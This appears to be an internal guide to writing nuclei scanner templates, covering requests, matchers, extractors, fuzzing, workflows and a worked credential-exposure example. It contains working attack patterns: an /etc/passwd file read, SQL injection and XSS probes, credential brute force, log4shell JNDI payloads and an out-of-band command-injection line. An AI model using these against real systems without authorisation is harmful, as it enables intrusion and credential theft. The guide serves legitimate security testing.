# nuclei — template authoring

A template is one YAML file: `id`, `info`, then one or more protocol blocks
(here: `http`). Validate with `nuclei -t ./t.yaml -validate`, run with
`nuclei -t ./t.yaml -u https://192.0.2.10 -debug` to see every request/response.

## Skeleton

```yaml
id: my-template-id            # unique, lowercase, hyphens; becomes template-id in JSONL
info:
  name: Human Readable Name
  author: operator
  severity: critical          # info|low|medium|high|critical|unknown
  description: One or two sentences on the weakness.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-00000
  classification:
    cve-id: CVE-2024-00000
    cwe-id: CWE-89
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  tags: cve,cve2024,sqli,exampleapp
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/items?id=1'"
    matchers:
      - type: word
        words:
          - "SQL syntax"
```

Built-in variables: `{{BaseURL}}` (full input URL), `{{RootURL}}`
(scheme://host:port), `{{Hostname}}` (host:port), `{{Host}}`, `{{Port}}`,
`{{Scheme}}`, `{{Path}}`. Operator variables come from `-V name=value` and are
used as `{{name}}`. Helper functions: `base64()`, `url_encode()`, `md5()`,
`rand_base(n)`, `rand_int(min,max)`, `concat()`, `to_lower()`, `hex_encode()`,
`generate_java_gadget()`, etc.

## HTTP requests

### Simple form

```yaml
http:
  - method: POST
    path:
      - "{{BaseURL}}/api/login"
    headers:
      Content-Type: application/json
      X-Forwarded-For: 127.0.0.1
    body: '{"user":"admin","pass":"admin"}'
    redirects: true
    max-redirects: 3
```

### Raw requests (full control, multi-step)

```yaml
http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=admin
      - |
        GET /admin/export?file=/etc/passwd HTTP/1.1
        Host: {{Hostname}}
    cookie-reuse: true          # carry session cookies across the raw requests
    req-condition: true         # lets DSL matchers reference body_1, body_2, status_code_2 ...
    matchers:
      - type: dsl
        dsl:
          - "status_code_2 == 200 && contains(body_2, 'root:x:0:0')"
```

`cookie-reuse: true` is how you write login-then-exploit chains. With
`req-condition: true`, matcher/extractor DSL can address each response as
`body_1`, `status_code_1`, `header_2`, etc.

Other request-level keys: `stop-at-first-match: true`, `host-redirects`,
`unsafe: true` (rawhttp — malformed requests for smuggling), `race: true` +
`race_count` (race conditions via `raw` with gate), `threads` (payload
concurrency).

## Matchers

Types: `status`, `word`, `regex`, `binary` (hex), `size`, `dsl`.

```yaml
matchers-condition: and         # and|or across matchers (default or)
matchers:
  - type: status
    status:
      - 200
      - 500
  - type: word
    part: body                  # body|header|all|interactsh_protocol|raw
    words:
      - "db_password"
      - "secret_key"
    condition: or               # and|or within the matcher's list (default or)
    case-insensitive: true
  - type: regex
    part: header
    regex:
      - "Set-Cookie: admin_session=.*"
  - type: binary
    binary:
      - "504b0304"              # ZIP magic — backup files
  - type: dsl
    dsl:
      - 'status_code == 200 && len(body) > 1024 && contains(tolower(body), "index of /")'
  - type: word
    part: body
    words:
      - "error"
    negative: true              # must NOT match
```

Name matchers (`name: step2-rce`) to tell them apart in JSONL `matcher-name`.
Useful DSL functions in matchers: `contains()`, `contains_any()`, `regex()`,
`len()`, `tolower()`, `status_code`, `content_length`, `duration` (time-based
blind: `duration >= 6`), `all_headers`, `body`.

## Extractors

Pull data out of responses — into output (`extracted-results`) or into later
requests (`internal: true` → `{{name}}`).

```yaml
extractors:
  - type: regex
    name: version
    part: body
    group: 1
    regex:
      - 'Powered by ExampleApp v([0-9.]+)'
  - type: kval                  # key-value: headers & cookies (dashes -> underscores)
    kval:
      - set_cookie
      - x_powered_by
  - type: json                  # jq-style on JSON bodies
    json:
      - '.data.token'
  - type: xpath
    attribute: href
    xpath:
      - "/html/body//a"
  - type: dsl
    dsl:
      - 'md5(body)'
  - type: regex
    name: csrf                  # internal: feed {{csrf}} to the next raw request
    internal: true
    group: 1
    regex:
      - 'name="csrf" value="([a-f0-9]+)"'
```

## Payloads and attack modes

Any template becomes a fuzzer with `payloads:` + markers in path/body/raw.

```yaml
http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{user}}&password={{pass}}
    attack: clusterbomb         # batteringram|pitchfork|clusterbomb
    payloads:
      user:
        - admin
        - root
      pass: /opt/wordlists/top100-passwords.txt   # inline list OR file path
    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - "status_code == 302 && contains(all_headers, 'session=')"
```

- `batteringram`: one payload set, same value substituted everywhere.
- `pitchfork`: parallel iteration (user[i] with pass[i]) — credential stuffing.
- `clusterbomb`: full cartesian product — brute force.

## Interactsh (blind / OOB)

Place `{{interactsh-url}}` anywhere; nuclei registers a unique subdomain and
polls for interactions.

```yaml
http:
  - raw:
      - |
        GET /?q={{url_encode('${jndi:ldap://{{interactsh-url}}/x}')}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: ${jndi:ldap://{{interactsh-url}}/ua}
    matchers:
      - type: word
        part: interactsh_protocol    # dns | http | smtp
        words:
          - "dns"
      - type: regex
        part: interactsh_request
        regex:
          - "/x"                     # which injection point fired
```

Use for blind SSRF, log4shell-style JNDI, blind XXE, blind command injection
(`;nslookup {{interactsh-url}};`), and email-based flows (smtp protocol).

## DAST / fuzzing templates

Fuzzing templates mutate parts of input URLs (run with `-dast`; feed URLs that
have query strings):

```yaml
id: reflected-param-fuzz
info:
  name: Reflected input in query parameters
  severity: medium
  author: operator
  tags: dast,xss
http:
  - method: GET
    payloads:
      probe:
        - 'zx9"<probe>'
    fuzzing:
      - part: query               # query|path|header|cookie|body|request
        type: replace             # replace|postfix|prefix|infix
        mode: single              # single (one param at a time) | multiple (all at once)
        fuzz:
          - "{{probe}}"
    matchers:
      - type: word
        part: body
        words:
          - 'zx9"<probe>'
```

`part: query` iterates every query parameter. Combine with interactsh for blind
SSRF param fuzzing (`fuzz: ["https://{{interactsh-url}}"]`).

## Worked example — full detect-and-extract template

Target bug: ExampleApp <= 2.3 exposes an unauthenticated config endpoint
leaking DB credentials at `/exampleapp/config.json`.

```yaml
id: exampleapp-config-exposure
info:
  name: ExampleApp <= 2.3 Unauthenticated Config Exposure
  author: operator
  severity: high
  description: >
    /exampleapp/config.json is readable without authentication and contains
    database credentials.
  classification:
    cwe-id: CWE-200
  tags: exposure,config,exampleapp
http:
  - method: GET
    path:
      - "{{BaseURL}}/exampleapp/config.json"
      - "{{BaseURL}}/config.json"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - '"db_password"'
          - '"db_user"'
        condition: and
    extractors:
      - type: json
        json:
          - '.db_user'
          - '.db_password'
      - type: regex
        name: version
        group: 1
        regex:
          - '"version":\s*"([0-9.]+)"'
```

Development loop:

```sh
nuclei -t ./exampleapp-config-exposure.yaml -validate
nuclei -t ./exampleapp-config-exposure.yaml -u https://192.0.2.10 -debug
nuclei -t ./exampleapp-config-exposure.yaml -l live-urls.txt -je exampleapp.jsonl
python3 scripts/parse_nuclei.py exampleapp.jsonl --work-units units.json --findings findings.json --assets assets.json
```

The extracted credentials go straight into the finding evidence; file via the
`finding-report` skill (see `references/rupu.md`).

## Workflows

```yaml
id: exampleapp-workflow
info:
  name: ExampleApp detect-then-exploit
  author: operator
workflows:
  - template: ./exampleapp-detect.yaml
    matchers:
      - name: exampleapp-v2        # only when this named matcher fired
        subtemplates:
          - template: ./exampleapp-config-exposure.yaml
          - template: ./exampleapp-sqli.yaml
  - template: http/technologies/wordpress-detect.yaml
    subtemplates:
      - tags: wordpress            # chain by tag instead of path
```

Run: `nuclei -l live-urls.txt -w exampleapp-workflow.yaml -je wf.jsonl`.
Workflows only run subtemplates on hosts where the parent matched — the manual
equivalent of `-as`.
